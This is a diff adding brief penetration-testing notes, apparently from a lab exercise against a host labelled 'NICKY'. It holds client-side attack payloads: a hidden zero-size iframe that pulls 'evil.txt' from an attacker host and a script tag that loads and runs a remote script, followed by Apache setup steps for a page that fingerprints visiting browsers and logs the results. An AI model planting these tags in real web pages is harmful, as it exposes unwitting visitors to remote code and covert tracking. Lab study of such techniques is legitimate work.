@@ -1,0 +1,16 @@
+# 10.1.1.224 NICKY
+# Request file on local host
+<iframe src=http://192.168.119.208/evil.txt height='0' width='0'></iframe>
+# Execute script from local host
+<script src=http://192.168.119.148/juju></script>
+
+# Fingerprint the web client
+# 10.1.1.224 NICKY
+/var/www/html/finger.html
+/var/www/html/finger.php
+sudo mkdir /var/www/finger
+sudo touch /var/www/finger/finger.txt
+sudo chown -R www-data:www-data /var/www/finger/
+sudo systemctl restart apache2
+# test by browsing to http://127.0.0.1/finger.html
+cat /var/www/finger/finger.txt
